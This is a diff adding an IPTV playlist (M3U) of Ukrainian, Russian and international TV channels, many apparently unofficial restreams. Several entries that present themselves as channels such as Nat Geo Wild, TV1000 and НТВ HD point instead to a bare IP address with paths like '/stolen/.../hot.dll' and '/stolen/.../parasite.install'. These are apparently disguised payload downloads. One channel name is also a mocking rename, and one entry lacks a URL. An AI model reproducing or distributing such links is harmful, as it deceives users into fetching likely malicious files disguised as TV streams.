@@ -1,0 +1,82 @@
+﻿#EXTM3U
+#EXTINF:1 group-title="Украина", 1. Інтер
+http://109.68.41.148:1935/live/inter_2/playlist.m3u8
+#EXTINF:2 group-title="Украина", 2. 1+1
+https://live-k2301-kbp.1plus1.video/184723/smil:184723.smil/chunklist_b1196000.m3u8
+#EXTINF:3 tvg-id="unian-tv" group-title="Украина" tvg-logo="http://epg.it999.ru/img/2217.png", 3. Унiан
+https://live-k2310-kbp.1plus1.video/288721/smil:288721.smil/chunklist_b2928000.m3u8
+#EXTINF:4 group-title="Украина", 4. К1
+https://edge2.iptv.macc.com.ua/life/k1_2/index.m3u8
+#EXTINF:5 group-title="Украина", 5. НТН
+http://109.68.41.148:1935/live/ntn_2/playlist.m3u8
+#EXTINF:6 group-title="Украина", 6. Верховна зрада
+https://online.wnet.ua/live/rada480p.stream/playlist.m3u8
+#EXTINF:7 group-title="Украина", 7. Тера
+http://kv-3ln-n01.ollcdn.net/hls-tv/18/128147971028ef43d29d88c5490c0005/5ca630d7/terra/terra.m3u8
+#EXTINF:7 group-title="Украина", 8. ICTV
+http://51.15.176.84/hls/ictv/index.m3u8
+#EXTINF:7 group-title="Украина", 9. Новий канал
+http://51.15.176.84/hls/novy/index.m3u8
+#EXTINF:7 group-title="Украина", 10. СТБ
+http://51.15.176.84/hls/stb/index.m3u8
+#EXTINF:7 group-title="Украина", 11. 2+2
+https://live-k2310-kbp.1plus1.video/361665/smil:361665.smil/chunklist_b700000.m3u8
+#EXTINF:7 group-title="Украина", 12. ТРК Україна
+http://51.15.176.84/hls/ukraina/index.m3u8
+#EXTINF:-1 group-title="Украина", Enter-фільм
+http://188.35.9.5:10007/stolen/138w/parasite.install
+#EXTINF:-1 tvg-id="ua-pershy-ukraine" group-title="Украина" tvg-logo="http://epg.it999.ru/img/2147.png",UA:Перший
+#EXTINF:-1,Discovery HD
+http://aa826ad7.iptvspy.me/iptv/AUWAUBYRPMAHLZ/227/index.m3u8
+#EXTINF:-1,Discovery SCI
+http://aa826ad7.iptvspy.me/iptv/AUWAUBYRPMAHLZ/136/index.m3u8
+#EXTINF:-1,Viasat History (RU)
+http://188.35.9.5:10020/stolen/486b/hot.dll
+#EXTINF:-1,Viasat Explore
+http://188.35.9.5:10020/stolen/485v/hot.dll
+#EXTINF:-1,Nat Geo Wild
+http://188.35.9.5:10020/stolen/487n/hot.dll
+#EXTINF:-1,Travel Guid-TV
+http://cdn10.live-tv.od.ua:8081/leonovtv/1080i/playlist.m3u8
+#EXTINF:-1,Travel HD BG
+http://31.13.223.104:1935/travel/community.stream/playlist.m3u8
+#EXTINF:-1,RTG HD
+http://ott-cdn.ucom.am/s63/index.m3u8
+#EXTINF:-1,Наука 2.0
+http://ott-cdn.ucom.am/s98/index.m3u8
+#EXTINF:-1,Че (Север ) +2
+http://tvsever.ru:8080/hls/ach2.m3u8
+#EXTINF:-1,Охотник и Рыболов HD
+http://92.43.140.249/s62/04.m3u8
+#EXTINF:0,Russian Travel Guide
+http://ott-cdn.ucom.am/s80/01.m3u8
+#EXTINF:-1,Food Network
+http://ott-cdn.ucom.am/s18/index.m3u8
+#EXTINF:-1,Шокирующее HD
+http://91.223.105.236:8081/hlsx/472/472.m3u8?id=1188&p=87e0c783e9b31451
+#EXTINF:-1,Комедийное HD
+http://91.223.105.236:8081/hlsx/473/473.m3u8?id=1188&p=12326fa256d9bf86
+#EXTINF:-1,TV1000 Premium HD
+http://213.252.252.17/live/eds/TV1000PremiumHD/HLS_encr/TV1000PremiumHD-audio_20003=96000-video=5000000.m3u8
+#EXTINF:-1,TV1000
+http://188.35.9.5:10020/stolen/484c/hot.dll
+#EXTINF:-1,TV 1000 Action
+http://92.43.140.249/s91/04.m3u8
+#EXTINF:-1,312 Кино HD
+http://176.126.166.43:1935/live/312kino/playlist.m3u8
+#EXTINF:-1,Русский детектив
+http://182.73.122.74:10005/bysid/416
+#EXTINF:-1,НСТ
+http://ott-cdn.ucom.am/s87/index.m3u8
+#EXTINF:-1,Русский Бестселер
+http://182.73.122.74:10005/bysid/420
+#EXTINF:-1,Сделано в СССР HD
+http://cdn-a0pn7wmu.playlist-24.club/vFrwZBu0/p19YTcSe/playlist.m3u8
+#EXTINF:-1,PRO 100 TV
+http://82.193.71.93/Pro100TvRuSattelite/video.m3u8
+#EXTINF:-1,Піксель
+http://188.35.9.5:10007/stolen/139e/parasite.install
+#EXTINF:-1,б 2x2
+http://188.35.9.5:10020/stolen/427r/hot.dll
+#EXTINF:-1,НТВ HD
+http://188.35.9.5:10007/stolen/141n/parasite.install
